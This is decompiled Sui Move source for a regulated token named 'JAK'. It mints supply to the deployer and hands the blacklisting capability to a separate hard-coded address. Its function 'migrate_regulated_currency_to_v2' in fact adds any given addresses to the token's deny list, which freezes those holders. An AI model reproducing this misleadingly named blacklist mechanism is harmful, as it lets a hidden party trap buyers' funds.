module 0x54c016bc2769bcf9e1a2585afa870dc2b4cfa79ff32cb78903a164ca99446d54::JAK {
    struct JAK has drop {
        dummy_field: bool,
    }

    fun init(arg0: JAK, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency<JAK>(arg0, 2, b"JAK", b"JAK", b"JAK", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe_from_bytes(b"https://arweave.net/KNR4WPvsAcqhIqU8qNQHt2v0Kh1hNauaj4Mu79s8zsA?ext=png")), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<JAK>>(v2);
        0x2::transfer::public_transfer<0x2::coin::DenyCap<JAK>>(v1, @0x8bcc0e6cadf05f36018b1dff59d669b358a5aad6e5d05ad00bda60873cf0cb5c);
        let v3 = v0;
        0x2::coin::mint_and_transfer<JAK>(&mut v3, 100000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_transfer<0x2::coin::TreasuryCap<JAK>>(v3, 0x2::tx_context::sender(arg1));
    }

    entry fun migrate_regulated_currency_to_v2(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCap<JAK>, arg2: vector<address>, arg3: &mut 0x2::tx_context::TxContext) {
        let v0 = 0;
        while (v0 < 0x1::vector::length<address>(&mut arg2)) {
            let v1 = 0x1::vector::pop_back<address>(&mut arg2);
            if (!0x2::coin::deny_list_contains<JAK>(arg0, v1)) {
                0x2::coin::deny_list_add<JAK>(arg0, arg1, v1, arg3);
            };
            v0 = v0 + 1;
        };
    }

    // decompiled from Move bytecode v6
}

